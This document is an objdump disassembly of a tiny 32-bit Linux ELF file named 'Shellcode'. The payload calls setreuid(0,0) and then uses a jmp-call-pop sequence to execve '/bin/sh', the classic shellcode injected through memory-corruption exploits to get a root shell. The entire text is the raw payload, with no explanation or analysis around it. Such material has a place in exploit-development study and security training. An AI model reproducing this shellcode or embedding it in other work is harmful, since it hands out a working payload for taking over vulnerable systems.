
src/Shellcode:     file format binary


Disassembly of section .data:

00000000 <.data>:
   0:	7f 45                	jg     0x47
   2:	4c                   	dec    %esp
   3:	46                   	inc    %esi
   4:	01 01                	add    %eax,(%ecx)
   6:	01 00                	add    %eax,(%eax)
	...
  10:	02 00                	add    (%eax),%al
  12:	03 00                	add    (%eax),%eax
  14:	01 00                	add    %eax,(%eax)
  16:	00 00                	add    %al,(%eax)
  18:	54                   	push   %esp
  19:	90                   	nop
  1a:	04 08                	add    $0x8,%al
  1c:	34 00                	xor    $0x0,%al
  1e:	00 00                	add    %al,(%eax)
  20:	a8 00                	test   $0x0,%al
  22:	00 00                	add    %al,(%eax)
  24:	00 00                	add    %al,(%eax)
  26:	00 00                	add    %al,(%eax)
  28:	34 00                	xor    $0x0,%al
  2a:	20 00                	and    %al,(%eax)
  2c:	01 00                	add    %eax,(%eax)
  2e:	28 00                	sub    %al,(%eax)
  30:	05 00 02 00 01       	add    $0x1000200,%eax
	...
  3d:	90                   	nop
  3e:	04 08                	add    $0x8,%al
  40:	00 90 04 08 84 00    	add    %dl,0x840804(%eax)
  46:	00 00                	add    %al,(%eax)
  48:	84 00                	test   %al,(%eax)
  4a:	00 00                	add    %al,(%eax)
  4c:	06                   	push   %es
  4d:	00 00                	add    %al,(%eax)
  4f:	00 00                	add    %al,(%eax)
  51:	10 00                	adc    %al,(%eax)
  53:	00 31                	add    %dh,(%ecx)
  55:	c0                   	(bad)  
  56:	b0 46                	mov    $0x46,%al
  58:	31 db                	xor    %ebx,%ebx
  5a:	31 c9                	xor    %ecx,%ecx
  5c:	cd 80                	int    $0x80
  5e:	eb 18                	jmp    0x78
  60:	59                   	pop    %ecx
  61:	31 c0                	xor    %eax,%eax
  63:	88 41 07             	mov    %al,0x7(%ecx)
  66:	89 49 08             	mov    %ecx,0x8(%ecx)
  69:	89 41 0c             	mov    %eax,0xc(%ecx)
  6c:	b0 0b                	mov    $0xb,%al
  6e:	8d 19                	lea    (%ecx),%ebx
  70:	8d 51 0c             	lea    0xc(%ecx),%edx
  73:	8d 49 08             	lea    0x8(%ecx),%ecx
  76:	cd 80                	int    $0x80
  78:	e8 e3 ff ff ff       	call   0x60
  7d:	2f                   	das    
  7e:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  81:	2f                   	das    
  82:	73 68                	jae    0xec
